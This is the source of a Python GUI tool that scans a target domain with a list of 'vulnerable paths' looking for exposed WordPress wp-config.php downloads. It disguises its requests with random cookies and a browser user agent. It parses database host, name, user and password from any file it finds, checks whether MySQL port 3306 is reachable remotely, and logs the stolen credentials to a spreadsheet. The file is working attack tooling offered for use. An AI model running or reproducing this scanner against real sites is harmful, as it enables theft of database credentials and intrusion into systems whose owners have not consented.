# -*- coding: utf-8 -*-

# DEPENDENCIES --------------------------------------------------------------- #
from concurrent.futures import ThreadPoolExecutor, as_completed
from datetime import datetime
from os import path, stat, getenv, environ
from random import choices
from re import search, compile, IGNORECASE
from socket import gethostbyname, socket, AF_INET, SOCK_STREAM
from string import ascii_letters, digits
from sys import exit as sysExit
from ctypes import windll, c_bool, c_wchar_p

# external
from dotenv import load_dotenv
from niquests import Session, adapters
from openpyxl import load_workbook, Workbook
from PyQt5 import QtCore, QtWidgets

# custom
from gui import Ui_mainWindow
from modules import resources
from modules.custom_logger import exception
# ---------------------------------------------------------------------------- #

# WINDOW --------------------------------------------------------------------- #
load_dotenv()

# enabling high dpi scalling
environ["QT_SCALE_FACTOR"] = "1.2"
environ["QT_AUTO_SCREEN_SCALE_FACTOR"] = "1"
environ["QT_SCALE_FACTOR_ROUNDING_POLICY"] = "PassThrough"

if hasattr(QtCore.Qt, "AA_Use96Dpi"):
  QtCore.QCoreApplication.setAttribute(QtCore.Qt.AA_Use96Dpi, True)
if hasattr(QtCore.Qt, "AA_UseHighDpiPixmaps"):
  QtCore.QCoreApplication.setAttribute(QtCore.Qt.AA_UseHighDpiPixmaps, True)
if hasattr(QtCore.Qt, "AA_EnableHighDpiScaling"):
  QtCore.QCoreApplication.setAttribute(QtCore.Qt.AA_EnableHighDpiScaling, True)

# defining gui elements
ui = Ui_mainWindow()
app = QtWidgets.QApplication([])
MainWindow = QtWidgets.QMainWindow()

# setting new flags for a window
MainWindow.setWindowFlags(
  QtCore.Qt.WindowCloseButtonHint
)

# setting a ban on starting more than one process (new program window)
mutexName = f"Global\\{QtWidgets.QApplication.applicationName()}"
mutex = windll.kernel32.CreateMutexW(None, c_bool(True), c_wchar_p(mutexName))

if not mutex or windll.kernel32.GetLastError() == 183: # ALREADY_EXISTS
  QtWidgets.QMessageBox.critical(
    None,
    "ERROR",
    "The program is already running!"
  )
  sysExit()
# ---------------------------------------------------------------------------- #

# LOGIC ---------------------------------------------------------------------- #
class Controller():
  def __init__(self):
    super().__init__()

    self.target = str()
    self.params = list([
      True, # parse found configs
      False, # some action...
      False, # some action...
      False, # some action...
      False, # some action...
      False, # some action...
      False, # some action...
      False # some action...
    ])
    self.vulnerablePathList = str()
    self.totalNumberOfVPaths = int(0)
    self.threads = int()
    self.timeout = float()

    # configuring dynamic UI text using environment variables that make it easy to update the UI without changes:
    # - provides quick rebranding (changing the name/description)
    # - simplifies updating the legal text (changing the disclaimer)
    # - avoids hard-coded values while maintaining text centralization
    # - changes only require adjusting the environment configuration, not editing the code
    ui.logPanel.setPlainText(getenv("DISCLAIMER"))
    ui.programDescription.setText(getenv("DESCRIPTION"))

    # binding handlers to buttons
    ui.vulnerablePathList_button.clicked.connect(lambda: self.selectVulnerablePathList())
    ui.startScan_button.clicked.connect(lambda: self.startScan())
    ui.getInfo_button.clicked.connect(lambda: self.getInfo())
    ui.stopScan_button.clicked.connect(lambda: self.stopScan())
    ui.copyLogs_button.clicked.connect(lambda: self.copyLogs())
    ui.clearLogs_button.clicked.connect(lambda: self.clearLogs())

  def selectVulnerablePathList(self):
    selectedFilePath = QtWidgets.QFileDialog.getOpenFileName(None, "Select a file", "./res/vpaths", "*.txt")[0]

    if (selectedFilePath):
      filePath = selectedFilePath.split("./")[-1]

      # counting the total number of lines
      with open(selectedFilePath, "r", encoding = "utf-8-sig") as selectedList:
        numberOfLines = int(len(selectedList.readlines()))

      self.vulnerablePathList = str(selectedFilePath)
      self.totalNumberOfVPaths = numberOfLines

      ui.vulnerablePathList_button.setToolTip(filePath)
      ui.vulnerablePathList_placeholder.setToolTip(str(numberOfLines) + (" line" if numberOfLines == 1 else " lines"))
      ui.vulnerablePathList_placeholder.setPlaceholderText(path.basename(filePath))
    else:
      # resetting an already selected list
      self.vulnerablePathList = str()

      ui.vulnerablePathList_button.setToolTip("Select a file")
      ui.vulnerablePathList_placeholder.setToolTip("")

      return ui.vulnerablePathList_placeholder.setPlaceholderText("The path to the file")

  def startScan(self):
    # resetting progress (if it has already been started)
    self.stopScan()

    # checking the specified «target» domain
    if ui.target_input.text() != "":
      pattern = compile(
        r"^"
        r"(?:[a-z0-9\u00a1-\uffff]"
        r"-?"
        r")+"
        r"(?:"
        r"\."
        r"[a-z\u00a1-\uffff]"
        r"(?:"
        r"[a-z0-9\u00a1-\uffff-]"
        r")*"
        r")+"
        r"$",
        IGNORECASE
      )

      if not pattern.match(ui.target_input.text()):
        return ui.logPanel.setPlainText("[!] Incorrect format of the «target» domain")
      else:
        self.target = ui.target_input.text()
    else:
      return ui.logPanel.setPlainText("[!] Specify the «target» domain")

    # checking selected «vulnerable path list»
    if self.vulnerablePathList != "":
      # checking the path for the existence of a file
      if not path.exists(self.vulnerablePathList):
        return ui.logPanel.setPlainText(f"[!] Vulnerable path list «{path.basename(self.vulnerablePathList.split("./")[-1])}» does not exist")

      # checking the file size
      if stat(self.vulnerablePathList).st_size == 0:
        return ui.logPanel.setPlainText("[!] Vulnerable path list is empty")
    else:
      return ui.logPanel.setPlainText("[!] Select a «vulnerable path list»")

    # checking the number of «threads»
    self.threads = (int(ui.threads_input.text()) if search(r"^([\s\d]+)$", ui.threads_input.text()) else 0)

    if not (self.threads != 0 and self.threads <= 10):
      return ui.logPanel.setPlainText("[!] The number of «threads» cannot be like this value")

    # checking the number of «timeout»
    self.timeout = float(ui.timeout_input.text()) if (search(r"^((?!0$|0\d|\.0$|0\.0$)(?=.*\d)\d*(\.\d+)?)", ui.timeout_input.text()) and ui.timeout_input.text() != ".0.") else 0.0

    if not (self.timeout != 0.0 and self.timeout <= 9.9):
      return ui.logPanel.setPlainText("[!] The «timeout» cannot be null or empty")

    # checking action list
    for index, action in enumerate((ui.param_1, ui.param_2, ui.param_3, ui.param_4, ui.param_5, ui.param_6, ui.param_7, ui.param_8)):
      if action.isChecked():
        self.params[index] = True
      else:
        self.params[index] = False

    # TODO: This could be implemented better, but it works for now ----------- #
    # determining the start time of the execution
    startTime = datetime.now()

    ui.logPanel.setPlainText(f"[!] START - {str(startTime.strftime("%H:%M:%S"))}\n")

    # definition of a new (separate from main ui) thread, for the working
    self.worker = Worker()
    self.thread = QtCore.QThread()

    # defining slots for transmitting/receiving data from a thread
    self.worker.target = self.target
    self.worker.vulnerablePathList = self.vulnerablePathList
    self.worker.totalNumberOfVPaths = self.totalNumberOfVPaths
    self.worker.params = self.params
    self.worker.threads = self.threads
    self.worker.timeout = self.timeout
    self.worker.newMessageForLogPanel.connect(lambda value: ui.logPanel.appendPlainText(value))

    # passing the main working module to a separate thread
    self.worker.moveToThread(self.thread)

    # defining parameters that are configured at the time the thread is executing
    self.thread.started.connect(lambda: ui.vulnerablePathList_button.setEnabled(False))

    self.thread.started.connect(lambda: ui.param_1.setEnabled(False))
    self.thread.started.connect(lambda: ui.param_2.setEnabled(False))
    self.thread.started.connect(lambda: ui.param_3.setEnabled(False))
    self.thread.started.connect(lambda: ui.param_4.setEnabled(False))
    self.thread.started.connect(lambda: ui.param_5.setEnabled(False))
    self.thread.started.connect(lambda: ui.param_6.setEnabled(False))
    self.thread.started.connect(lambda: ui.param_7.setEnabled(False))
    self.thread.started.connect(lambda: ui.param_8.setEnabled(False))

    self.thread.started.connect(lambda: ui.startScan_button.setEnabled(False))
    self.thread.started.connect(lambda: ui.getInfo_button.setEnabled(False))
    self.thread.started.connect(lambda: ui.stopScan_button.setEnabled(True))

    self.thread.started.connect(lambda: ui.threads_input.setEnabled(False))
    self.thread.started.connect(lambda: ui.timeout_input.setEnabled(False))
    self.thread.started.connect(lambda: ui.copyLogs_button.setEnabled(False))
    self.thread.started.connect(lambda: ui.clearLogs_button.setEnabled(False))

    self.thread.started.connect(self.worker.run)

    # defining the parameters that are configured at the time the thread terminates
    self.worker.finished.connect(self.thread.quit)
    self.worker.finished.connect(self.worker.deleteLater)
    self.thread.finished.connect(self.thread.deleteLater)

    self.thread.finished.connect(lambda: ui.vulnerablePathList_button.setEnabled(True))

    self.thread.started.connect(lambda: ui.param_1.setEnabled(True))
    self.thread.started.connect(lambda: ui.param_2.setEnabled(True))
    self.thread.started.connect(lambda: ui.param_3.setEnabled(True))
    self.thread.started.connect(lambda: ui.param_4.setEnabled(True))
    self.thread.started.connect(lambda: ui.param_5.setEnabled(True))
    self.thread.started.connect(lambda: ui.param_6.setEnabled(True))
    self.thread.started.connect(lambda: ui.param_7.setEnabled(True))
    self.thread.started.connect(lambda: ui.param_8.setEnabled(True))

    self.thread.finished.connect(lambda: ui.progressBar.setValue(100))
    self.thread.finished.connect(lambda: ui.startScan_button.setEnabled(True))
    self.thread.finished.connect(lambda: ui.getInfo_button.setEnabled(True))
    self.thread.started.connect(lambda: ui.stopScan_button.setEnabled(False))

    self.thread.started.connect(lambda: ui.threads_input.setEnabled(True))
    self.thread.started.connect(lambda: ui.timeout_input.setEnabled(True))
    self.thread.finished.connect(lambda: ui.copyLogs_button.setEnabled(True))
    self.thread.finished.connect(lambda: ui.clearLogs_button.setEnabled(True))

    self.thread.finished.connect(lambda: ui.logPanel.appendPlainText(f"\n[!] END - {str(datetime.now().strftime("%H:%M:%S"))} ({str(round((datetime.now() - startTime).total_seconds(), 2))}s)"))

    # updating progress bar value
    self.worker.progress.connect(lambda value: ui.progressBar.setValue(value))

    # running a separated thread
    self.thread.start()
    # TODO: ------------------------------------------------------------------ #

  def getInfo(self):
    return ui.logPanel.setPlainText(getenv("DISCLAIMER"))

  def stopScan(self):
    # setting the status for the worker
    if hasattr(self, "worker"):
      self.worker.stop()

    ui.stopScan_button.setEnabled(False)
    ui.progressBar.setValue(0)

  def copyLogs(self):
    return QtWidgets.QApplication.clipboard().setText(ui.logPanel.document().toPlainText())

  def clearLogs(self):
    return ui.logPanel.clear()

class Worker(QtCore.QObject):
  # defining signals for transmitting/receiving data from a ui
  target = QtCore.pyqtSignal(str)
  vulnerablePathList = QtCore.pyqtSignal(str)
  params = QtCore.pyqtSignal(list)
  progress = QtCore.pyqtSignal(int)
  threads = QtCore.pyqtSignal(int)
  timeout = QtCore.pyqtSignal(float)
  newMessageForLogPanel = QtCore.pyqtSignal(str)
  finished = QtCore.pyqtSignal()

  def __init__(self):
    super().__init__()

    # setting the status for the worker
    self._running = True

    # initializing the niquests session
    self.niquestsSession = Session(multiplexed = True)
    adapter = adapters.HTTPAdapter(
      pool_maxsize = 10,
      max_retries = 3
    )
    self.niquestsSession.mount("http://", adapter)
    self.niquestsSession.mount("https://", adapter)

  def run(self):
    while self._running:
      self.checkDomain()
      self.stop()

    self.finished.emit()

  def checkDomain(self):
    # creating a list of paths found in the file
    with open(self.vulnerablePathList, "r", encoding = "utf-8-sig") as pathList:
      pathList = [line.strip() for line in pathList if line.strip()]

    def generateCookie():
      # generate random parts for the cookie
      randomPart1 = "".join(choices(ascii_letters + digits, k = 10))
      randomPart2 = "".join(choices(ascii_letters + digits, k = 10))
      randomPart3 = "".join(choices(ascii_letters + digits, k = 10))

      return f"beget=begetok; vqnKIpzcj-mfe={randomPart1}; IrEZaSgOL={randomPart2}; ifBegSmJ={randomPart3}"

    # default headers with generated cookie and user agent
    self.headers = {
      # [!] we could use static values here, but random cookie generation makes requests look more natural
      "Cookie": generateCookie(),
      "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.12; rv:86.0) Gecko/20100101 Firefox/86.0"
    }

    # initialize counters for paths
    self.currentPathNumber = int(0)
    self.numberOfScannedPaths = int(0)
    self.numberOfInvalidPaths = int(0)
    self.numberOfSuccessPaths = int(0)

    def fetchData(path):
      message = ""

      try:
        fullUrl = "http://" + self.target + path

        with self.niquestsSession.get(
          fullUrl,
          timeout = self.timeout,
          headers = self.headers,
          allow_redirects = True
        ) as response:
          if response.status_code in (200, 301):
            if "wp-config.php" in response.headers.get("Content-Disposition", ""):
              self.parseConfigFile(path, response)

              # stopping the scanning process if a vulnerability is found
              self.numberOfSuccessPaths += 1
              message = "success"
            else:
              message = "sensitive data was not found"
          else:
            message = "vulnerability not found"
      except Exception as error:
        message = "timeout"
        exception(error)

      self.numberOfScannedPaths += 1
      self.currentPathNumber += 1

      return message

    def displayResults():
      if self.numberOfScannedPaths or self.currentPathNumber:
        # output the number of paths after the scan is completed
        self.newMessageForLogPanel.emit(f"Total: {str(self.numberOfScannedPaths)}")

        # displays information about the scan if the "display only successful results" mode is not enabled
        self.newMessageForLogPanel.emit(
          (f"Invalid: {str(self.numberOfInvalidPaths)}\n" if self.numberOfInvalidPaths else "") +
          (f"Success: {str(self.numberOfSuccessPaths)}")
        )

    # defining multithreading
    with ThreadPoolExecutor(max_workers = self.threads) as executor:
      futures = {executor.submit(fetchData, path.rstrip("\n")): path for path in pathList}

      for future in as_completed(futures):
        if not self._running:
          self.newMessageForLogPanel.emit("[!] SCANNING WAS CANCELED\n")
          return displayResults()

        path = futures[future]
        response = future.result()
        progressPercentage = round((self.currentPathNumber / self.totalNumberOfVPaths) * 100)

        self.progress.emit(progressPercentage)
        self.newMessageForLogPanel.emit(f"[{"+" if response == "success" else "-"}] {path} -- {response}\n")

      return displayResults()

  def parseConfigFile(self, path, response):
    self.dataList = []
    self.dbHost = "N/A"
    self.dbName = "N/A"
    self.dbUser = "N/A"
    self.dbPassword = "N/A"
    self.tablePrefix = "N/A"
    self.mysqlRemoteAccess = "N/A"

    if self.params[0]:
      # extract relevant lines from the response
      for line in response.text.splitlines():
        if any(keyword in line for keyword in ["DB_HOST", "DB_NAME", "DB_USER", "DB_PASSWORD", "table_prefix"]):
          self.dataList.append(line)

      def parseDataList(varname, line_number):
        return self.dataList[line_number].replace("define", "").replace(varname, "").replace("\'", "").replace("\"", "").replace(";", "").replace("(", "").replace(")", "").replace(",", "").replace(" ", "").replace("=", "").split(".//", 1)[0]

      # parse each data field
      self.dbHost = parseDataList("DB_HOST", 3)
      self.dbName = parseDataList("DB_NAME", 0)
      self.dbUser = parseDataList("DB_USER", 1)
      self.dbPassword = parseDataList("DB_PASSWORD", 2)
      self.tablePrefix = self.dataList[4].replace("$table_prefix", "").replace("\'", "").replace("\"", "").replace(";", "").replace(" ", "").replace("=", "").split(".//", 1)[0]

      # resolve localhost to ip
      if self.dbHost in ["localhost", "localhost:3306"]:
        self.dbHost = gethostbyname(self.target)

      # check mysql server remote access
      try:
        a_socket = socket(AF_INET, SOCK_STREAM)
        location = (self.dbHost, 3306)
        resultOfCheck = a_socket.connect_ex(location)
        self.mysqlRemoteAccess = "YES" if resultOfCheck == 0 else "NO"

        a_socket.close()
      except Exception as error:
        self.mysqlRemoteAccess = "N/A"

    self.writeResultsToDoc(path)

  def writeResultsToDoc(self, path):
    tableSheetName = str(f"./res/result.xlsx")

    try:
      # attempt to open the file if it exists
      workbook = load_workbook(tableSheetName)
      defaultSheet = workbook.active
    except FileNotFoundError:
      # if the file doesn't exist, create a new one
      workbook = Workbook()
      defaultSheet = workbook.active
      defaultSheet.append([
        "DOMAIN",
        "VULNERABLE_PATH",
        "DB_HOSTNAME",
        "DB_BASENAME",
        "DB_USERNAME",
        "DB_PASSWORD",
        "TABLE_PREFIX",
        "MYSQL_REMOTE_ACCESS"
      ])

    # add data to the file
    defaultSheet.append([
      str(self.target),
      str(path),
      str(self.dbHost),
      str(self.dbName),
      str(self.dbUser),
      str(self.dbPassword),
      str(self.tablePrefix),
      str(self.mysqlRemoteAccess)
    ])
    workbook.save(tableSheetName)

  def stop(self):
    self._running = False
# ---------------------------------------------------------------------------- #

# FINISH --------------------------------------------------------------------- #
# rendering app
ui.setupUi(MainWindow)
MainWindow.show()

# launching the control example
Controller()
sysExit(app.exec_())
# ---------------------------------------------------------------------------- #